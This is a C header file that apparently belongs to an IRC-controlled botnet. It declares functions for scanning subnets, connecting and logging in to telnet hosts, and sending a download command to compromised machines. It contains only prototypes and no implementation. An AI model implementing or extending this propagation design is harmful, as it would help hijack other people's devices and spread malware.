#ifndef SCANNER_H
#define SCANNER_H

typedef struct {
	int fd_telnet;
	char ip[16];
} telnet_info;

int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c);
char * get_subnet_address(); 
int telnet_connect(telnet_info *info);
int telnet_login(telnet_info *info);
void terminal_set(int telnet_fd);
void send_download_command(int fd_telnet);

#endif
